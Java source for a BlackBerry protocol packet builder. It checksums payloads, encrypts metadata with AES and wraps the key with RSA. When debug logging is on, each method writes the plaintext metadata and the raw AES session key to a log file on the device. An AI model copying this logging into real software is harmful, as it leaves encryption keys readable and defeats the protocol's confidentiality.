package com.vvt.prot.databuilder;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.Calendar;
import java.util.Vector;
import net.rim.device.api.i18n.SimpleDateFormat;
import com.vvt.checksum.CRC32;
import com.vvt.checksum.CRC32Listener;
import com.vvt.encryption.AESEncryptor;
import com.vvt.encryption.DataTooLongForRSAEncryptionException;
import com.vvt.encryption.RSAEncryption;
import com.vvt.prot.CommandCode;
import com.vvt.prot.CommandData;
import com.vvt.prot.CommandMetaData;
import com.vvt.prot.command.TransportDirectives;
import com.vvt.prot.databuilder.exception.CRC32Exception;
import com.vvt.prot.parser.ProtocolParser;
import com.vvt.std.ByteUtil;
import com.vvt.std.FileUtil;
import com.vvt.std.IOUtil;
import com.vvt.std.Log;

public class ProtocolPacketBuilder implements CRC32Listener {

	private static final String TAG = "ProtocolPacketBuilder";
	private String errMsg = "CRC32 Error";
	private boolean isCRC32Completed = false;
	private CommandMetaData cmdMetaData = null;
	
	public ProtocolPacketBuilderResponse buildCmdPacketData(CommandMetaData cmdMetaData, CommandData cmdData, 
															String payloadPath, byte[] publicKey, long ssid, 
															TransportDirectives transport) 
															throws IOException, InterruptedException, CRC32Exception, 
															NullPointerException, DataTooLongForRSAEncryptionException, 
															IllegalArgumentException {
		
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".buildCmdPacketData()", "ssid: " + ssid);
		}
		this.cmdMetaData = cmdMetaData;
		ProtocolPacketBuilderResponse protPacketBuilderResponse = null;
		CommandCode cmdCode = cmdData.getCommand();
		PayloadBuilderResponse payloadBuilderResponse = PayloadBuilder.getInstance(cmdCode).buildPayload(cmdMetaData, cmdData, payloadPath, transport);
		cmdMetaData.setTransportDirective(transport);
		if (payloadBuilderResponse.getPayloadType().equals(PayloadType.FILE)) {
			//Calculate CRC32 of Payload
//			Vector payloadPaths = payloadBuilderResponse.getFilePathStore();
//			String filePath = payloadBuilderResponse.getFilePath();
			CRC32 crc32 = new CRC32(payloadPath, this);
			crc32.calculate();
			crc32.join();
			if (isCRC32Completed) {
				isCRC32Completed = false;				
				long payloadSize = 0;
				/*for (int i = 0; i < payloadPaths.size(); i++) {
					payloadSize += FileUtil.getFileSize((String) payloadPaths.elementAt(i));
				}*/
				payloadSize = FileUtil.getFileSize(payloadPath);
				cmdMetaData.setPayloadSize(payloadSize);
				//Parse MetaData
				byte[] metaData = ProtocolParser.parseCommandMetadata(cmdMetaData);	
				if (Log.isDebugEnable()) {
					/*FileUtil.writeToFile("file:///store/home/user/Paintext_MetaData.txt", metaData);
					FileUtil.writeToFile("file:///store/home/user/PublicKey.txt", publicKey);
					FileUtil.writeToFile("file:///store/home/user/AesKey.txt", payloadBuilderResponse.getAesKey());*/
					String dataType = "Paintext_MetaData";
					String logFile = "file:///store/home/user/binary-logs.txt";
					SimpleDateFormat clock  = new SimpleDateFormat("dd MM yyyy HH:mm:ss:SSS");
					String content = clock.format(Calendar.getInstance())+"\t"+dataType+"\n"+
					new String(metaData)+"\n\n";
					FileUtil.append(logFile, content);
					
					dataType = "PublicKey";
					content = clock.format(Calendar.getInstance())+"\t"+dataType+"\n"+
					new String(publicKey)+"\n\n";
					FileUtil.append(logFile, content);
					
					dataType = "AesKey";
					content = clock.format(Calendar.getInstance())+"\t"+dataType+"\n"+
					new String(payloadBuilderResponse.getAesKey())+"\n\n";
					FileUtil.append(logFile, content);
				}
				//Encrypt MetaData
				byte[] encData = encryptMetaData(payloadBuilderResponse.getAesKey(), metaData);
				if (Log.isDebugEnable()) {
//					FileUtil.writeToFile("file:///store/home/user/Enc_MetaData.txt", encData);
					String dataType = "Enc_MetaData";
					String logFile = "file:///store/home/user/binary-logs.txt";
					SimpleDateFormat clock  = new SimpleDateFormat("dd MM yyyy HH:mm:ss:SSS");
					String content = clock.format(Calendar.getInstance())+"\t"+dataType+"\n"+
					new String(encData)+"\n\n";
					FileUtil.append(logFile, content);
				}
				//Set MetaData_Header
				metaData = setMetaDataHeader(encData, publicKey, payloadBuilderResponse.getAesKey(), ssid);
				protPacketBuilderResponse = setResponse(payloadBuilderResponse.getAesKey(), metaData, payloadBuilderResponse.getByteData(), payloadBuilderResponse.getFilePath(), payloadBuilderResponse.getPayloadType());
//				protPacketBuilderResponse = setResponse(payloadBuilderResponse.getAesKey(), metaData, payloadBuilderResponse.getByteData(), payloadBuilderResponse.getFilePathStore(), payloadBuilderResponse.getPayloadType());
				protPacketBuilderResponse.setPayloadSize(payloadSize);
				protPacketBuilderResponse.setPayloadCRC32(cmdMetaData.getPayloadCrc32());
				if (Log.isDebugEnable()) {
//					FileUtil.writeToFile("file:///store/home/user/ClientHeader.txt", metaData);
					String dataType = "ClientHeader";
					String logFile = "file:///store/home/user/binary-logs.txt";
					SimpleDateFormat clock  = new SimpleDateFormat("dd MM yyyy HH:mm:ss:SSS");
					String content = clock.format(Calendar.getInstance())+"\t"+dataType+"\n"+
					new String(metaData)+"\n\n";
					FileUtil.append(logFile, content);
				}
			} else {
				Log.error(TAG + ".buildCmdPacketData()", errMsg);
				throw new CRC32Exception(errMsg);
			}
		} else {
			byte[] payloadData = payloadBuilderResponse.getByteData();
			long crc32 = CRC32.calculate(payloadData);
			cmdMetaData.setPayloadCrc32(crc32);
			long payloadSize = payloadData.length;
			cmdMetaData.setPayloadSize(payloadSize);
			//Parse MetaData
			byte[] metaData = ProtocolParser.parseCommandMetadata(cmdMetaData);	
			if (Log.isDebugEnable()) {
				/*FileUtil.writeToFile("file:///store/home/user/Paintext_MetaData.txt", metaData);
				FileUtil.writeToFile("file:///store/home/user/PublicKey.txt", publicKey);
				FileUtil.writeToFile("file:///store/home/user/AesKey.txt", payloadBuilderResponse.getAesKey());*/
				String dataType = "Paintext_MetaData";
				String logFile = "file:///store/home/user/binary-logs.txt";
				SimpleDateFormat clock  = new SimpleDateFormat("dd MM yyyy HH:mm:ss:SSS");
				String content = clock.format(Calendar.getInstance())+"\t"+dataType+"\n"+
				new String(metaData)+"\n\n";
				FileUtil.append(logFile, content);
				
				dataType = "PublicKey";
				content = clock.format(Calendar.getInstance())+"\t"+dataType+"\n"+
				new String(publicKey)+"\n\n";
				FileUtil.append(logFile, content);
				
				dataType = "AesKey";
				content = clock.format(Calendar.getInstance())+"\t"+dataType+"\n"+
				new String(payloadBuilderResponse.getAesKey())+"\n\n";
				FileUtil.append(logFile, content);
			}
			//Encrypt MetaData
			byte[] encData = encryptMetaData(payloadBuilderResponse.getAesKey(), metaData);	
			if (Log.isDebugEnable()) {
//				FileUtil.writeToFile("file:///store/home/user/Enc_MetaData.txt", encData);
				String dataType = "Enc_MetaData";
				String logFile = "file:///store/home/user/binary-logs.txt";
				SimpleDateFormat clock  = new SimpleDateFormat("dd MM yyyy HH:mm:ss:SSS");
				String content = clock.format(Calendar.getInstance())+"\t"+dataType+"\n"+
				new String(encData)+"\n\n";
				FileUtil.append(logFile, content);
			}
			//Set MetaData_Header
			metaData = setMetaDataHeader(encData, publicKey, payloadBuilderResponse.getAesKey(), ssid);
			protPacketBuilderResponse = setResponse(payloadBuilderResponse.getAesKey(), metaData, payloadBuilderResponse.getByteData(), payloadBuilderResponse.getFilePath(), payloadBuilderResponse.getPayloadType());
//			protPacketBuilderResponse = setResponse(payloadBuilderResponse.getAesKey(), metaData, payloadBuilderResponse.getByteData(), payloadBuilderResponse.getFilePathStore(), payloadBuilderResponse.getPayloadType());
			protPacketBuilderResponse.setPayloadSize(payloadSize);
			protPacketBuilderResponse.setPayloadCRC32(crc32);
			if (Log.isDebugEnable()) {
//				FileUtil.writeToFile("file:///store/home/user/ClientHeader.txt", metaData);
				String dataType = "ClientHeader";
				String logFile = "file:///store/home/user/binary-logs.txt";
				SimpleDateFormat clock  = new SimpleDateFormat("dd MM yyyy HH:mm:ss:SSS");
				String content = clock.format(Calendar.getInstance())+"\t"+dataType+"\n"+
				new String(metaData)+"\n\n";
				FileUtil.append(logFile, content);
			}
		}
		return protPacketBuilderResponse;
	}
	
	public ProtocolPacketBuilderResponse buildResumeCmdPacketData(CommandMetaData cmdMetaData, String payloadPath, byte[] publicKey, 
																  byte[] aesKey, long ssid, TransportDirectives transport) 
																  throws IOException, InterruptedException, CRC32Exception, 
																  NullPointerException, DataTooLongForRSAEncryptionException, 
																  IllegalArgumentException {
		
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".buildResumeCmdPacketData()", "ssid: " + ssid);
		}
		ProtocolPacketBuilderResponse protPacketBuilderResponse = null;
		this.cmdMetaData = cmdMetaData;
		cmdMetaData.setTransportDirective(transport);		
		//Parse MetaData
		byte[] metaData = ProtocolParser.parseCommandMetadata(cmdMetaData);
		if (Log.isDebugEnable()) {
//			FileUtil.writeToFile("file:///store/home/user/BuildResume_Paintext_MetaData.txt", metaData);
			String dataType = "Resume_Paintext_MetaData";
			String logFile = "file:///store/home/user/binary-logs.txt";
			SimpleDateFormat clock  = new SimpleDateFormat("dd MM yyyy HH:mm:ss:SSS");
			String content = clock.format(Calendar.getInstance())+"\t"+dataType+"\n"+
			new String(metaData)+"\n\n";
			FileUtil.append(logFile, content);
		}
		//Encrypt MetaData
		byte[] encData = encryptMetaData(aesKey, metaData);
		//Set MetaData_Header
		metaData = setMetaDataHeader(encData, publicKey, aesKey, ssid);
		protPacketBuilderResponse = setResponse(aesKey, metaData, null, payloadPath, PayloadType.FILE);			
		if (Log.isDebugEnable()) {
			/*FileUtil.writeToFile("file:///store/home/user/BuildResume_ClientHeader.txt", metaData);
			FileUtil.writeToFile("file:///store/home/user/BuildResume_Enc_MetaData.txt", encData);
			FileUtil.writeToFile("file:///store/home/user/BuildResume_PublicKey.txt", publicKey);
			FileUtil.writeToFile("file:///store/home/user/BuildResume_AesKey.txt", aesKey);*/
			String dataType = "Resume_ClientHeader";
			String logFile = "file:///store/home/user/binary-logs.txt";
			SimpleDateFormat clock  = new SimpleDateFormat("dd MM yyyy HH:mm:ss:SSS");
			String content = clock.format(Calendar.getInstance())+"\t"+dataType+"\n"+
			new String(metaData)+"\n\n";
			FileUtil.append(logFile, content);
			
			dataType = "Resume_Enc_MetaData";
			content = clock.format(Calendar.getInstance())+"\t"+dataType+"\n"+
			new String(encData)+"\n\n";
			FileUtil.append(logFile, content);
			
			dataType = "Resume_PublicKey";
			content = clock.format(Calendar.getInstance())+"\t"+dataType+"\n"+
			new String(publicKey)+"\n\n";
			FileUtil.append(logFile, content);
			
			dataType = "Resume_AesKey";
			content = clock.format(Calendar.getInstance())+"\t"+dataType+"\n"+
			new String(aesKey)+"\n\n";
			FileUtil.append(logFile, content);
		}
		return protPacketBuilderResponse;
	}
	
	public ProtocolPacketBuilderResponse buildMetaData(CommandMetaData cmdMetaData, long payloadCrc32, long payloadSize, byte[] publicKey, byte[] aesKey, long ssid) throws IOException, NullPointerException, DataTooLongForRSAEncryptionException {
		ProtocolPacketBuilderResponse protPacketBuilderResponse = null;
		cmdMetaData.setPayloadSize(payloadSize);
		cmdMetaData.setPayloadCrc32(payloadCrc32);
		cmdMetaData.setTransportDirective(TransportDirectives.RASK);
		//Parse MetaData
		byte[] metaData = ProtocolParser.parseCommandMetadata(cmdMetaData);
		if (Log.isDebugEnable()) {
			/*FileUtil.writeToFile("file:///store/home/user/BuildRask_paintext_metadata.txt", metaData);
			FileUtil.writeToFile("file:///store/home/user/BuildRask_publicKey.txt", publicKey);
			FileUtil.writeToFile("file:///store/home/user/BuildRask_aesKey.txt", aesKey);*/
			String dataType = "Rask_paintext_metadata";
			String logFile = "file:///store/home/user/binary-logs.txt";
			SimpleDateFormat clock  = new SimpleDateFormat("dd MM yyyy HH:mm:ss:SSS");
			String content = clock.format(Calendar.getInstance())+"\t"+dataType+"\n"+
			new String(metaData)+"\n\n";
			FileUtil.append(logFile, content);
			
			dataType = "Rask_publicKey";
			content = clock.format(Calendar.getInstance())+"\t"+dataType+"\n"+
			new String(publicKey)+"\n\n";
			FileUtil.append(logFile, content);
			
			dataType = "Rask_aesKey";
			content = clock.format(Calendar.getInstance())+"\t"+dataType+"\n"+
			new String(aesKey)+"\n\n";
			FileUtil.append(logFile, content);
			Log.debug(TAG + ".buildMetaData()", "payloadCrc32: " + payloadCrc32 + "payloadSize: " + payloadSize + "ssid: " + ssid);
		}
		//Encrypt MetaData
		byte[] encData = encryptMetaData(aesKey, metaData);
		//Set MetaData_Header
		metaData = setMetaDataHeader(encData, publicKey, aesKey, ssid);
		if (Log.isDebugEnable()) {
			/*FileUtil.writeToFile("file:///store/home/user/BuildRask_enc_metadata.txt", encData);
			FileUtil.writeToFile("file:///store/home/user/BuildRask_ClientHeader.txt", metaData);*/
			String dataType = "Rask_enc_metadata";
			String logFile = "file:///store/home/user/binary-logs.txt";
			SimpleDateFormat clock  = new SimpleDateFormat("dd MM yyyy HH:mm:ss:SSS");
			String content = clock.format(Calendar.getInstance())+"\t"+dataType+"\n"+
			new String(encData)+"\n\n";
			FileUtil.append(logFile, content);
			
			dataType = "Rask_ClientHeader";
			content = clock.format(Calendar.getInstance())+"\t"+dataType+"\n"+
			new String(metaData)+"\n\n";
			FileUtil.append(logFile, content);
		}
		protPacketBuilderResponse = setResponse(aesKey, metaData, null, null, PayloadType.BUFFER);		
		return protPacketBuilderResponse;
	}
	
	private ProtocolPacketBuilderResponse setResponse(byte[] aesKey, byte[] metaData, byte[] payloadData, String payloadPath, PayloadType type) {
		ProtocolPacketBuilderResponse protPacketBuilderResponse = new ProtocolPacketBuilderResponse();
		protPacketBuilderResponse.setAesKey(aesKey);
		protPacketBuilderResponse.setMetaData(metaData);
		protPacketBuilderResponse.setPayloadData(payloadData);
		protPacketBuilderResponse.setPayloadPath(payloadPath);
		protPacketBuilderResponse.setPayloadType(type);
		return protPacketBuilderResponse;
	}
	
	private byte[] encryptMetaData(byte[] aesKey, byte[] data) throws IOException {
		byte[] encData = null;
		encData = AESEncryptor.encrypt(aesKey, data);
		data = encData;		
		return data;
	}	

	private byte[] setMetaDataHeader(byte[] metaData, byte[] publicKey, byte[] aesKey, long ssid) throws IOException, DataTooLongForRSAEncryptionException, NullPointerException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		DataOutputStream dos = new DataOutputStream(bos);
		try {
			byte encryptType = 1;
			dos.write(ByteUtil.toByte(encryptType));
			dos.write(ByteUtil.toByte((int)ssid));
			//AES_KEY is RSA Encrypted
			byte[] encAESKey = RSAEncryption.encrypt(publicKey, aesKey);
			short lenAESKey =  (short)encAESKey.length;
			dos.write(ByteUtil.toByte(lenAESKey));
			dos.write(encAESKey);
			short requestLen = (short)metaData.length;
			dos.write(ByteUtil.toByte(requestLen));
			//MetaData's CRC32
			int crc32 = (int)CRC32.calculate(metaData);
			dos.write(ByteUtil.toByte(crc32));
			dos.write(metaData);
			// To byte array.
			metaData = bos.toByteArray();			
			return metaData;
		} finally {
			IOUtil.close(dos);
			IOUtil.close(bos);
		}
	}
	
	//CRC32Listener
	public void CRC32Completed(long crc32) {
		isCRC32Completed = true;
		cmdMetaData.setPayloadCrc32(crc32);		
	}
	
	public void CRC32Error(String err) {
		isCRC32Completed = false;
		errMsg = err;
		Log.error(TAG + ".CRC32Error()", err);
	}	
}
